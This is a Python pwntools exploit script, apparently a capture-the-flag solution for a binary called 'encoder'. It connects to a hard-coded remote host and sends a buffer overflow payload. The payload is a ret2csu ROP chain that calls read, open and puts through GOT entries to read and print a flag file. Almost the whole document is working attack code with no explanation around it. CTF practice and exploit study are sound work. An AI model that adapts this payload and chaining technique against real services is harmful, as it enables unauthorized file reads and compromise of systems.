#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./encoder')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11675)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

puts_got = exe.got['puts']
read_got = exe.got['read']
open_got = exe.got['open']
csu_start_addr = 0x4013A0
csu_start_addr_without_mov_edi = 0x4013A9
csu_end_addr = 0x4013BA
POP_RDI = 0x4013c3
RET  = 0x40101a
POP_RSI_R15 = 0x4013c1


buf_addr = 0x4040A0


if args.LOCAL:
    fd = 3
    text = b"/flag.txt\x00"
else:
    fd = 5
    text = b"flag.txt\x00"

# csu:
#    r15 - func_addr_to_call
#    r14  -> rdx
#    r13  -> rsi
#    r12d -> edi
#    rbx = 0
#    rbp = 1
# rbx, rbp, r12, r13, r14, r15
# rbx, rbp, edi, rsi, rdx, call
pl = cyclic(15) + b"\x00"
pl = pl.ljust(72, b"\x00")
pl += p64(RET)
pl += p64(csu_end_addr) + p64(0) + p64(1) + p64(0) + p64(buf_addr+1) + p64(10) + p64(read_got)
pl += p64(csu_start_addr) + p64(0) + p64(0) + p64(1) + p64(0) + p64(0) + p64(0) + p64(open_got)
pl += p64(POP_RDI)
pl += p64(buf_addr+1)
pl += p64(POP_RSI_R15) + p64(0) + p64(open_got)
pl += p64(csu_start_addr_without_mov_edi) + p64(0) + p64(0) + p64(1) + p64(fd) + p64(buf_addr+1) + p64(41) + p64(read_got) # fd = 5 - random, if local fd = 3
# read: rdx -> num of bytes, rsi -> ptr to buf, rdi -> fd
# pl += p64(csu_start_addr) + p64(0) + p64(0) + p64(1) + p64(1) + p64(buf_addr+1) + p64(41) + p64(write_got)
pl += p64(csu_start_addr) + p64(0) + p64(0) + p64(1) + p64(buf_addr+1) + p64(1) + p64(0) + p64(puts_got)
# puts: rdi -> ptr to buf
pl += p64(csu_start_addr)
pl += p64(RET)
io.sendline(pl+b"\x00")
# io.recvuntil("0.0001")
io.recvuntil("0.000")
io.recvline()
io.sendline(text)
# io.sendline(b"/flag\x00")


flag = io.recvuntil("}").decode()
log.success(f"Flag: {flag}")

# io.interactive()

io.close()

